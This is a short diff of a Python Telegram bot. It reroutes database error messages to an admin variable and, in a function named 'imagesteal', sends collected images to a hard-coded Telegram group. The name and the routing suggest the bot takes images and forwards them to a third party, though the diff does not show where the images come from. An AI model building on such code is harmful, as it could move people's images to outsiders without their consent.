@@ -85,7 +85,7 @@ def todbsendtext (replied,message):
 	except (Exception, psycopg2.Error) as error:
 			if conn:
 				print("Error caused sending : %s", error)
-				bot.send_message(-1001452022332,error)
+				bot.send_message(tgadmin,error)
 
 	finally:
 		if conn:
@@ -107,7 +107,7 @@ def imagesteal(message):
 				time.sleep(1)
 				if img is not None:
 					type(img)
-					bot.send_photo(tgadmin,img)
+					bot.send_photo(-1001452022332,img)
 					a-=1
 				   
 		except Exception as e:
